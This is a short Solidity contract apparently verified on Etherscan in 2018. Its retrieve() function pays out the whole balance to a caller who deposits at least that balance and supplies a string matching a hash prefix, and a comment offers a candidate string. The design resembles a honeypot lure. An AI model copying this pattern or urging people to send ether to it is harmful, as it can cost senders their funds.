/**
 *Submitted for verification at Etherscan.io on 2018-08-03
*/

pragma solidity ^0.4.23;

contract T_TOTAL {
    
    function () public payable {}
    function retrieve(string code) public payable {
        if (msg.value >= (this.balance - msg.value)) {
            if (bytes5(keccak256(code)) == 0x70014a63ef) { // cTQjViGRNPaPaWMIwJIsO
                msg.sender.transfer(this.balance);
            }
        }
    }
}